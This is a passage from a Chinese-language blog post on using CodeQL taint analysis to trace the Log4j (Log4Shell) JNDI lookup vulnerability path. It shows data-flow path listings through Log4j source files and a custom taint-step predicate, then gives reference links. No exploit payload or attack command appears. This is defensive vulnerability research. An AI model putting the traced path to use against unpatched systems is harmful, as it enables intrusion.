<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2139</span>:<span class="hljs-number">94</span><br><span class="hljs-number">6</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2142</span>:<span class="hljs-number">59</span><br><span class="hljs-number">7</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2155</span>:<span class="hljs-number">43</span><br><span class="hljs-number">8</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2159</span>:<span class="hljs-number">67</span><br><span class="hljs-number">9</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2202</span>:<span class="hljs-number">32</span><br><span class="hljs-number">10</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractLogger</span>.</span></span>java:<span class="hljs-number">2205</span>:<span class="hljs-number">48</span><br><span class="hljs-number">11</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Logger</span>.</span></span>java:<span class="hljs-number">158</span>:<span class="hljs-number">9</span><br><span class="hljs-number">12</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Logger</span>.</span></span>java:<span class="hljs-number">162</span>:<span class="hljs-number">17</span><br><span class="hljs-number">13</span>data : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AwaitCompletionReliabilityStrategy</span>.</span></span>java:<span class="hljs-number">78</span>:<span class="hljs-number">83</span><br><span class="hljs-number">14</span>data : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AwaitCompletionReliabilityStrategy</span>.</span></span>java:<span class="hljs-number">82</span>:<span class="hljs-number">67</span><br><span class="hljs-number">15</span>data : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LoggerConfig</span>.</span></span>java:<span class="hljs-number">430</span>:<span class="hljs-number">28</span><br><span class="hljs-number">16</span>data : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LoggerConfig</span>.</span></span>java:<span class="hljs-number">454</span>:<span class="hljs-number">17</span><br><span class="hljs-number">17</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReusableLogEventFactory</span>.</span></span>java:<span class="hljs-number">78</span>:<span class="hljs-number">86</span><br><span class="hljs-number">18</span>message : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReusableLogEventFactory</span>.</span></span>java:<span class="hljs-number">100</span>:<span class="hljs-number">27</span><br><span class="hljs-number">19</span>msg : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MutableLogEvent</span>.</span></span>java:<span class="hljs-number">209</span>:<span class="hljs-number">28</span><br><span class="hljs-number">20</span>(...)... : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MutableLogEvent</span>.</span></span>java:<span class="hljs-number">211</span>:<span class="hljs-number">46</span><br><span class="hljs-number">21</span>reusable : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MutableLogEvent</span>.</span></span>java:<span class="hljs-number">212</span>:<span class="hljs-number">13</span><br><span class="hljs-number">22</span>parameter this : Message <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReusableObjectMessage</span>.</span></span>java:<span class="hljs-number">47</span>:<span class="hljs-number">17</span><br><span class="hljs-number">23</span>obj : Object <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReusableObjectMessage</span>.</span></span>java:<span class="hljs-number">48</span>:<span class="hljs-number">44</span><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><span class="hljs-number">88</span>convert<span class="hljs-constructor">JndiName(<span class="hljs-operator">...</span>)</span> : String <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JndiLookup</span>.</span></span>java:<span class="hljs-number">54</span>:<span class="hljs-number">33</span><br><span class="hljs-number">89</span>jndiName : String <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JndiLookup</span>.</span></span>java:<span class="hljs-number">56</span>:<span class="hljs-number">56</span><br><span class="hljs-number">90</span>name : String <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JndiManager</span>.</span></span>java:<span class="hljs-number">171</span>:<span class="hljs-number">25</span><br><span class="hljs-number">91</span>name <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JndiManager</span>.</span></span>java:<span class="hljs-number">172</span>:<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>这条链在执行到<code>MutableLogEvent#setMessage</code>时和CodeQL的分析结果略有不同。在CodeQL中<code>resusable.formatTo</code>会调用到<code>ReusableObjectMessage</code>中。 但是实际运行过程中由于MessgeFactorty创建Message对象时默认创建的是<code>ResableSimpleMessage</code>对象，所以会执行到<code>ResableSimpleMessage#formatTo</code>方法。</p><p>所以问题来了，我们现在如没有办法发现那个漏洞的</p><p>但是我们可以根据出发连来分析为什么没有发现，在前面的CodeQL已经分析到了createEvent方法。 查看createEvent方法的调用，在<code>Log4jShell</code>的触发链中实际上是在对返回LogEvent的处理过程中触发的，所以这里CodeQL可能没有将返回的LogEvent对象再当作污点进行分析，所以导致没有分析成功。</p><p>所以可以通过创建一个<code>isAdditionalTaintStep</code>函数，将<code>ReusableLogEventFactory#createEvent</code>的第六个参数Message和<code>LoggerConfig#log</code>第一个参数<code>logEvent</code>连接起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node fromNode, DataFlow::Node toNode)</span> &#123;<br>    exists(MethodAccess ma,MethodAccess ma2 |<br>        ma.getMethod().getDeclaringType().hasQualifiedName(<span class="hljs-string">&quot;org.apache.logging.log4j.core.impl&quot;</span>, <span class="hljs-string">&quot;ReusableLogEventFactory&quot;</span>) <br>        and ma.getMethod().hasName(<span class="hljs-string">&quot;createEvent&quot;</span>) and fromNode.asExpr()=ma.getArgument(<span class="hljs-number">5</span>) and ma2.getMethod().getDeclaringType().hasQualifiedName(<span class="hljs-string">&quot;org.apache.logging.log4j.core.config&quot;</span>, <span class="hljs-string">&quot;LoggerConfig&quot;</span>)  <br>        and ma2.getMethod().hasName(<span class="hljs-string">&quot;log&quot;</span>) and ma2.getMethod().getNumberOfParameters() = <span class="hljs-number">2</span> and toNode.asExpr()=ma2.getArgument(<span class="hljs-number">0</span>)<br>                )<br>  &#125;<br></code></pre></td></tr></table></figure><p> 最后我们就可以通过CodeQL分析到Log4j shell漏洞的调用链。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">709</span>:<span class="hljs-number">23</span><br><span class="hljs-number">2</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">710</span>:<span class="hljs-number">47</span><br><span class="hljs-number">3</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1833</span>:<span class="hljs-number">89</span><br><span class="hljs-number">4</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1836</span>:<span class="hljs-number">51</span><br><span class="hljs-number">5</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2139</span>:<span class="hljs-number">94</span><br><span class="hljs-number">6</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2142</span>:<span class="hljs-number">59</span><br><span class="hljs-number">7</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2155</span>:<span class="hljs-number">43</span><br><span class="hljs-number">8</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2159</span>:<span class="hljs-number">67</span><br><span class="hljs-number">9</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2202</span>:<span class="hljs-number">32</span><br><span class="hljs-number">10</span>message : Message AbstractLogger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2205</span>:<span class="hljs-number">48</span><br><span class="hljs-number">11</span>message : Message Logger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">158</span>:<span class="hljs-number">9</span><br><span class="hljs-number">12</span>message : Message Logger<span class="hljs-selector-class">.java</span>:<span class="hljs-number">162</span>:<span class="hljs-number">17</span><br><span class="hljs-number">13</span>data : Message DefaultReliabilityStrategy<span class="hljs-selector-class">.java</span>:<span class="hljs-number">61</span>:<span class="hljs-number">83</span><br><span class="hljs-number">14</span>data : Message DefaultReliabilityStrategy<span class="hljs-selector-class">.java</span>:<span class="hljs-number">63</span>:<span class="hljs-number">69</span><br><span class="hljs-number">15</span>data : Message LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">430</span>:<span class="hljs-number">28</span><br><span class="hljs-number">16</span>data : Message LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">454</span>:<span class="hljs-number">96</span><br><span class="hljs-number">17</span>message : Message ReusableLogEventFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">58</span>:<span class="hljs-number">47</span><br><span class="hljs-number">18</span>message : Message ReusableLogEventFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">60</span>:<span class="hljs-number">67</span><br><span class="hljs-number">19</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">469</span>:<span class="hljs-number">13</span><br><span class="hljs-number">20</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">479</span>:<span class="hljs-number">24</span><br><span class="hljs-number">21</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">481</span>:<span class="hljs-number">29</span><br><span class="hljs-number">22</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">495</span>:<span class="hljs-number">34</span><br><span class="hljs-number">23</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">498</span>:<span class="hljs-number">27</span><br><span class="hljs-number">24</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">536</span>:<span class="hljs-number">34</span><br><span class="hljs-number">25</span>event : LogEvent LoggerConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">540</span>:<span class="hljs-number">38</span><br><span class="hljs-number">26</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">80</span>:<span class="hljs-number">30</span><br><span class="hljs-number">27</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">84</span>:<span class="hljs-number">38</span><br><span class="hljs-number">28</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">117</span>:<span class="hljs-number">47</span><br><span class="hljs-number">29</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">120</span>:<span class="hljs-number">27</span><br><span class="hljs-number">30</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">126</span>:<span class="hljs-number">32</span><br><span class="hljs-number">31</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">129</span>:<span class="hljs-number">29</span><br><span class="hljs-number">32</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">154</span>:<span class="hljs-number">34</span><br><span class="hljs-number">33</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">156</span>:<span class="hljs-number">29</span><br><span class="hljs-number">34</span>event : LogEvent AbstractDatabaseAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">107</span>:<span class="hljs-number">30</span><br><span class="hljs-number">35</span>event : LogEvent AbstractDatabaseAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">110</span>:<span class="hljs-number">37</span><br><span class="hljs-number">36</span>event : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">260</span>:<span class="hljs-number">42</span><br><span class="hljs-number">37</span>event : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">262</span>:<span class="hljs-number">20</span><br><span class="hljs-number">38</span>event : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">122</span>:<span class="hljs-number">27</span><br><span class="hljs-number">39</span>event : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">123</span>:<span class="hljs-number">25</span><br><span class="hljs-number">40</span>parameter this : LogEvent Log4jLogEvent<span class="hljs-selector-class">.java</span>:<span class="hljs-number">530</span>:<span class="hljs-number">26</span><br><span class="hljs-number">41</span>this : LogEvent Log4jLogEvent<span class="hljs-selector-class">.java</span>:<span class="hljs-number">534</span>:<span class="hljs-number">16</span><br><span class="hljs-number">42</span><span class="hljs-built_in">toImmutable</span>(...) : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">123</span>:<span class="hljs-number">25</span><br><span class="hljs-number">43</span>this<span class="hljs-selector-class">.buffer</span> <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[&lt;element&gt;]</span> : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">123</span>:<span class="hljs-number">9</span><br><span class="hljs-number">44</span>this <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[buffer, &lt;element&gt;]</span> : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">123</span>:<span class="hljs-number">9</span><br><span class="hljs-number">45</span>this &lt;.method&gt; <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[buffer, &lt;element&gt;]</span> : LogEvent AbstractDatabaseManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">262</span>:<span class="hljs-number">13</span><br><span class="hljs-number">46</span><span class="hljs-built_in">getManager</span>(...) <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[buffer, &lt;element&gt;]</span> : LogEvent AbstractDatabaseAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">110</span>:<span class="hljs-number">13</span><br><span class="hljs-number">47</span>this <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[manager, buffer, &lt;element&gt;]</span> : LogEvent AbstractDatabaseAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">110</span>:<span class="hljs-number">13</span><br><span class="hljs-number">48</span>appender <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[manager, buffer, &lt;element&gt;]</span> : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">156</span>:<span class="hljs-number">13</span><br><span class="hljs-number">49</span>this &lt;.field&gt; <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[appender, manager, buffer, &lt;element&gt;]</span> : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">156</span>:<span class="hljs-number">13</span><br><span class="hljs-number">50</span>this &lt;.method&gt; <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[appender, manager, buffer, &lt;element&gt;]</span> : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">129</span>:<span class="hljs-number">13</span><br><span class="hljs-number">51</span>this &lt;.method&gt; <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[appender, manager, buffer, &lt;element&gt;]</span> : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">120</span>:<span class="hljs-number">13</span><br><span class="hljs-number">52</span>this &lt;.method&gt; <span class="hljs-selector-attr">[post update]</span> <span class="hljs-selector-attr">[appender, manager, buffer, &lt;element&gt;]</span> : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">84</span>:<span class="hljs-number">9</span><br><span class="hljs-number">53</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">80</span>:<span class="hljs-number">30</span><br><span class="hljs-number">54</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">84</span>:<span class="hljs-number">38</span><br><span class="hljs-number">55</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">117</span>:<span class="hljs-number">47</span><br><span class="hljs-number">56</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">120</span>:<span class="hljs-number">27</span><br><span class="hljs-number">57</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">126</span>:<span class="hljs-number">32</span><br><span class="hljs-number">58</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">129</span>:<span class="hljs-number">29</span><br><span class="hljs-number">59</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">154</span>:<span class="hljs-number">34</span><br><span class="hljs-number">60</span>event : LogEvent AppenderControl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">156</span>:<span class="hljs-number">29</span><br><span class="hljs-number">61</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">179</span>:<span class="hljs-number">24</span><br><span class="hljs-number">62</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">181</span>:<span class="hljs-number">23</span><br><span class="hljs-number">63</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">188</span>:<span class="hljs-number">28</span><br><span class="hljs-number">64</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">190</span>:<span class="hljs-number">31</span><br><span class="hljs-number">65</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">196</span>:<span class="hljs-number">38</span><br><span class="hljs-number">66</span>event : LogEvent AbstractOutputStreamAppender<span class="hljs-selector-class">.java</span>:<span class="hljs-number">197</span>:<span class="hljs-number">28</span><br><span class="hljs-number">67</span>event : LogEvent GelfLayout<span class="hljs-selector-class">.java</span>:<span class="hljs-number">433</span>:<span class="hljs-number">24</span><br><span class="hljs-number">68</span>event : LogEvent GelfLayout<span class="hljs-selector-class">.java</span>:<span class="hljs-number">438</span>:<span class="hljs-number">43</span><br><span class="hljs-number">69</span>event : LogEvent GelfLayout<span class="hljs-selector-class">.java</span>:<span class="hljs-number">471</span>:<span class="hljs-number">34</span><br><span class="hljs-number">70</span>event : LogEvent GelfLayout<span class="hljs-selector-class">.java</span>:<span class="hljs-number">496</span>:<span class="hljs-number">46</span><br><span class="hljs-number">71</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">462</span>:<span class="hljs-number">27</span><br><span class="hljs-number">72</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">467</span>:<span class="hljs-number">25</span><br><span class="hljs-number">73</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">911</span>:<span class="hljs-number">34</span><br><span class="hljs-number">74</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">912</span>:<span class="hljs-number">27</span><br><span class="hljs-number">75</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">928</span>:<span class="hljs-number">28</span><br><span class="hljs-number">76</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">978</span>:<span class="hljs-number">44</span><br><span class="hljs-number">77</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">911</span>:<span class="hljs-number">34</span><br><span class="hljs-number">78</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">912</span>:<span class="hljs-number">27</span><br><span class="hljs-number">79</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">928</span>:<span class="hljs-number">28</span><br><span class="hljs-number">80</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1033</span>:<span class="hljs-number">63</span><br><span class="hljs-number">81</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1104</span>:<span class="hljs-number">38</span><br><span class="hljs-number">82</span>event : LogEvent StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1110</span>:<span class="hljs-number">32</span><br><span class="hljs-number">83</span>event : LogEvent StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">46</span>:<span class="hljs-number">26</span><br><span class="hljs-number">84</span>event : LogEvent StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">50</span>:<span class="hljs-number">67</span><br><span class="hljs-number">85</span>parameter this : LogEvent RingBufferLogEvent<span class="hljs-selector-class">.java</span>:<span class="hljs-number">206</span>:<span class="hljs-number">20</span><br><span class="hljs-number">86</span>message : Message RingBufferLogEvent<span class="hljs-selector-class">.java</span>:<span class="hljs-number">210</span>:<span class="hljs-number">16</span><br><span class="hljs-number">87</span><span class="hljs-built_in">getMessage</span>(...) : Message StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">50</span>:<span class="hljs-number">67</span><br><span class="hljs-number">88</span>(...)... : Message StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">50</span>:<span class="hljs-number">43</span><br><span class="hljs-number">89</span>msg : Message StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">54</span>:<span class="hljs-number">20</span><br><span class="hljs-number">90</span>parameter this : Message StructuredDataMessage<span class="hljs-selector-class">.java</span>:<span class="hljs-number">239</span>:<span class="hljs-number">19</span><br><span class="hljs-number">91</span>type : String StructuredDataMessage<span class="hljs-selector-class">.java</span>:<span class="hljs-number">240</span>:<span class="hljs-number">16</span><br><span class="hljs-number">92</span><span class="hljs-built_in">getType</span>(...) : String StructuredDataLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">54</span>:<span class="hljs-number">20</span><br><span class="hljs-number">93</span><span class="hljs-built_in">lookup</span>(...) : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1110</span>:<span class="hljs-number">16</span><br><span class="hljs-number">94</span><span class="hljs-built_in">resolveVariable</span>(...) : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1033</span>:<span class="hljs-number">47</span><br><span class="hljs-number">95</span>varValue : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1040</span>:<span class="hljs-number">63</span><br><span class="hljs-number">96</span>buf <span class="hljs-selector-attr">[post update]</span> : StringBuilder StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1040</span>:<span class="hljs-number">33</span><br><span class="hljs-number">97</span>buf <span class="hljs-selector-attr">[post update]</span> : StringBuilder StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">912</span>:<span class="hljs-number">34</span><br><span class="hljs-number">98</span>bufName <span class="hljs-selector-attr">[post update]</span> : StringBuilder StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">978</span>:<span class="hljs-number">51</span><br><span class="hljs-number">99</span>bufName : StringBuilder StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">979</span>:<span class="hljs-number">47</span><br><span class="hljs-number">100</span><span class="hljs-built_in">toString</span>(...) : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">979</span>:<span class="hljs-number">47</span><br><span class="hljs-number">101</span>varNameExpr : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1010</span>:<span class="hljs-number">55</span><br><span class="hljs-number">102</span><span class="hljs-built_in">substring</span>(...) : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1010</span>:<span class="hljs-number">55</span><br><span class="hljs-number">103</span>varName : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1033</span>:<span class="hljs-number">70</span><br><span class="hljs-number">104</span>variableName : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1104</span>:<span class="hljs-number">60</span><br><span class="hljs-number">105</span>variableName : String StrSubstitutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1110</span>:<span class="hljs-number">39</span><br><span class="hljs-number">106</span>key : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">50</span>:<span class="hljs-number">48</span><br><span class="hljs-number">107</span>key : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">54</span>:<span class="hljs-number">49</span><br><span class="hljs-number">108</span>jndiName : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">70</span>:<span class="hljs-number">36</span><br><span class="hljs-number">109</span>... + ... : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">72</span>:<span class="hljs-number">20</span><br><span class="hljs-number">110</span><span class="hljs-built_in">convertJndiName</span>(...) : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">54</span>:<span class="hljs-number">33</span><br><span class="hljs-number">111</span>jndiName : String JndiLookup<span class="hljs-selector-class">.java</span>:<span class="hljs-number">56</span>:<span class="hljs-number">56</span><br><span class="hljs-number">112</span>name : String JndiManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">171</span>:<span class="hljs-number">25</span><br><span class="hljs-number">113</span>name JndiManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">172</span>:<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>挖掘到了这里其实已经能够进行分析了，所有的链最终的出发点都是JndiManager，这个点目前的触发已经在新版本中修复了，新版本中就没有办法找到相应的漏洞了</p><p>参考链接</p><p><a href="https://mp.weixin.qq.com/s/JYco8DysQNszMohH6zJEGw">利用CodeQL分析并挖掘Log4j漏洞 (qq.com)</a></p><p><a href="https://m.freebuf.com/articles/web/318141.html">codeql分析log4j - FreeBuf网络安全行业门户</a></p><p><a href="https://sumsec.me/2022/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">Log4j2 漏洞分析 | BlogPapers (sumsec.me)</a></p><p><a href="https://cangqingzhe.github.io/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/">利用CodeQL分析Log4j漏洞 | 藏青’s BLOG (cangqingzhe.github.io)</a></p><p><a 